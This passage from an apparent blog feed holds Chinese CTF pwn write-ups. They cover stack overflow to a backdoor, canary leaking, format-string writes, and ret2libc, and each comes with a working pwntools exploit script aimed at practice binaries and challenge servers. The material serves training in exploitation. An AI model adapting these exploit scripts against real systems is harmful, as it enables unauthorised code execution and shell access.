class="line">数据在寄存器中的存放顺序，这个在格式化字符串漏洞中要格外注意，特别是64位，32位的先后顺序是eax-&gt;edx-&gt;ecx-&gt;ebx，64位的先后顺序是rdi-&gt;rsi-&gt;rdx-&gt;rcx-&gt;r8-&gt;r9</span><br></pre></td></tr></table></figure><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><p>涅普计划Pwn工具篇：<a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=17">https://www.bilibili.com/video/BV1VA411u7Tg?p=17</a></p><h2 id="1-nc-nc-nc"><a href="#1-nc-nc-nc" class="headerlink" title="1.nc!nc!nc!"></a>1.nc!nc!nc!</h2><p>nc 连接 就有flag</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-4.png"></p><h2 id="2-easyPwn"><a href="#2-easyPwn" class="headerlink" title="2.easyPwn"></a>2.easyPwn</h2><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-5.png"></p><p><strong>1.Relro：Full Relro（重定位表只读）</strong><br> 　Relocation Read Only， 重定位表只读。重定位表即.got 和 .plt 两个表。<br> <strong>2.Stack：No Canary found（能栈溢出）</strong><br> 　Canary, 金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack  overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断  stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取  Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。<br> <strong>3.NX： NX enable（不可执行内存）</strong><br> 　Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x  属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode  就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented  Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret  等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。<br> <strong>4.PIE： PIE enable（开启ASLR 地址随机化）</strong><br> 　Address space layout randomization，地址空间布局随机化。通过将数据随机放置来防止攻击。</p><p>可以看出是64位程序</p><p>拖入ida64</p><p>找到main函数</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-6.png"></p><p>发现栈溢出漏洞，gets函数不限制输入的个数，会造成溢出</p><p>跟进</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-7.png"></p><p>var_20 为 v4 起始地址，所以需要先填入 (32+8) = 40个数据，然后填入后门地址就能拿到shell或者flag</p><p>找后门地址</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-8.png"></p><p>这里有个backdoor(),填入这个地址不会cat flag，我们需要直接找到cat flag 的 地址</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-9.png"></p><p>我们直接找到了cat flag 的地址，填入</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;118.190.205.168&quot;,12429)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+ p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-geigei你真好"><a href="#3-geigei你真好" class="headerlink" title="3.geigei你真好"></a>3.geigei你真好</h2><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-10.png"></p><p>看出是32位文件，开启了Stack Canary保护</p><p>​    Canary, 金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack  overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断  stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取  Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p><p>拖入ida32</p><p>找到主函数</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-11.png"></p><p>跟进vuln()</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-12.png"></p><p>存在栈溢出，但需要泄露canary的值，我们看到有<code>printf(buf)</code>,可以用来读取canary的值</p><p>跟进v3</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-13.png"></p><p>可以看到v3的位置</p><p>再看buf</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-14.png"></p><p>所以我们需要填入（0x70-0xc）个数据，printf函数就会输出Canary的值，我们接受然后继续覆盖到r，填入后门地址，拿到flag</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;118.190.205.168&quot;,12429)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">0xc</span>))</span><br><span class="line">canary=u32(p.recv(numb=<span class="number">4</span>))-<span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary = &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = payload+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0x080491b2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-too-native"><a href="#4-too-native" class="headerlink" title="4.too native"></a>4.too native</h2><p><code>printf</code>函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。</p><p>格式化说明符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-15.png"></p><p>32位文件</p><p>拖入ida32</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-16.png"></p><p>可以看出v5[0]=10,拿到flag我们需要令v5[0]=100</p><p>前两个printf函数输出了a的值，和<strong>v5的地址</strong>！我们就可以拿到v5的地址，然后利用格式化字符串漏洞将v5[0]的值改为100，拿到flag</p><p>fgets()是我们输入，printf将我们的输入输出出来，这就可以利用。</p><p>需要先测一下偏移</p><p><img src="http://z1ek34r.github.io/2022/01/25/%E9%9D%92%E7%A7%91X%E5%B1%B1%E5%B8%88CTF%E9%83%A8%E5%88%86WP/pasted-17.png"></p><p>可以得到偏移是6</p><p>在pwntools中有现成的函数可以使用<code>fmtstr_payload</code>可以实现修改任意内存<br> <code>fmtstr_payload(auto.offset, &#123;printf_got: system_addr&#125;)</code>(偏移，{原地址：65153151})</p><p>利用fmstr_payload函数我们就可以拿到flag</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;47.95.118.24&quot;,15989)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a = 10\n&#x27;</span>)</span><br><span class="line">v0_addr=(<span class="built_in">int</span>(p.recvline().decode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(v0_addr)</span><br><span class="line">payload = fmtstr_payload(offset,&#123;v0_addr:<span class="number">100</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;1-Welcome&quot;&gt;&lt;a href=&quot;#1-Welcome&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://z1ek34r.github.io/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://z1ek34r.github.io/tags/Pwn/"/>
    
    <category term="Crypro" scheme="http://z1ek34r.github.io/tags/Crypro/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-PWN-1-3</title>
    <link href="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/"/>
    <id>http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/</id>
    <published>2022-01-25T10:27:14.000Z</published>
    <updated>2022-01-25T11:45:15.092Z</updated>
    
    <content type="html"><![CDATA[<p><strong>pwn 签到题</strong><br> nc 连上就有flag<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted0.png"> </p><p><strong>pwn 02</strong><br>简单的ret2txt </p><p>先检验一下文件<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted1.png"> </p><p>是32位文件<br>且只有堆栈不可执行保护<br>checksec 结果可参考<a href="https://www.jianshu.com/p/31449fdfe35f">checksec</a> </p><p>在ubuntu上运行<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted2.png"><br>存在栈溢出 </p><p>用IDApro 32位 打开<br>首先看main函数<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted3.png"><br>那么接着跟到pwnme函数<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted4.png"><br>可以看到buf只有9个字节 而fgets读入了50个字节，所以就导致了栈溢出 </p><p>进入char s<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted5.png"><br>可以看到从第一个s开始输入只需输入9+4=13个脏数据<br>然后加上ret要返回的/bin/sh的地址即可得到shell </p><p>需要找到/bin/sh<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted6.png"><br>发现了stack函数 所以只需要将ret指向stack函数首地址即可得到shell<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted7.png"> </p><p>故exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./stack&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28137</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">    payload += p32(<span class="number">0x804850F</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行得到flag<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted8.png"><br><strong>pwn 03</strong><br>ret2libc </p><p>同上<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted9.png"><br>堆栈不可执行<br>拖入IDA，先看main函数<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted10.png"><br>再看pwnme<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted11.png"><br>存在栈溢出 进入s<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted12.png"> </p><p>需要输入9+4=13个脏数据 然后ret指向shellcode “/bin/sh” </p><p><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted13.png"> </p><p>但是程序里没有system函数，无法直接调用 </p><p>这个时候就涉及到plt表和got表了 程序执行后，plt表里是got表的地址，got表是函数的真实地址 程序还未执行时，got表里还是plt表的地址 我们需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样 但也只是针对于地址中间位进行随机，最低的12位并不会发生改变 也就是我们需要获取到远程环境的函数的真实地址 进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell </p><p>我们利用puts函数来进行这一步 </p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28169</span>)    </span><br><span class="line">    elf = ELF(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">    get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br></pre></td></tr></table></figure><p>运行脚本<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted14.png"></p><p>然后到libcsearch网站  <a href="https://libc.blukat.me/">libc database search</a><br>输入puts 和 得到地址的后三位<br>找到对应libc<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted15.png"></p><p>进入得到偏移信息<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted16.png"></p><p>最终exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28109</span>)    </span><br><span class="line">    elf = ELF(<span class="string">&quot;./stack1&quot;</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span>*<span class="number">13</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">    get_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(get_addr))</span><br><span class="line">    libcbase = get_addr - <span class="number">0x067360</span></span><br><span class="line">    system_addr = libcbase + <span class="number">0x03cd10</span></span><br><span class="line">    bin_sh = libcbase + <span class="number">0x17b8cf</span></span><br><span class="line">    payload = flat([<span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>,system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>&nbsp;</p><p>运行脚本得到flag<br><img src="http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted17.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;pwn 签到题&lt;/strong&gt;&lt;br&gt; nc 连上就有flag&lt;br&gt;&lt;img src=&quot;http://z1ek34r.github.io/2022/01/25/CTFshow-PWN-1-3/pasted0.png&quot;&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;p</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://z1ek34r.github.io/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://z1ek34r.github.io/tags/Pwn/"/>
    
  </entry>
  
</feed>
